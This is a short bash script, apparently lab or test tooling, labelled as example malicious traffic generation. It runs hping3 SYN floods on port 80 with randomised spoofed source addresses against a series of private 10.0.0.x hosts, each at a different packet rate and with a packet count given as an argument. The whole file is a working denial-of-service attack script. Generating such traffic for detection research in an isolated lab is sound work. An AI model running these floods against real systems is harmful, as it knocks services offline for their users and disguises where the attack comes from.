#!/bin/bash
# Example malicious traffic generation

hping3 -i u1 -c $1 -S -p 80 --rand-source 10.0.0.2
hping3 -i u10 -c $1 -S -p 80 --rand-source 10.0.0.3
hping3 -i u100 -c $1 -S -p 80 --rand-source 10.0.0.4
hping3 -i u1000 -c $1 -S -p 80 --rand-source 10.0.0.5
hping3 -i u10000 -c $1 -S -p 80 --rand-source 10.0.0.6
hping3 -i u10 -c $1 -S -p 80 --rand-source 10.0.0.7
hping3 -i u100 -c $1 -S -p 80 --rand-source 10.0.0.8
hping3 -i u1000 -c $1 -S -p 80 --rand-source 10.0.0.9
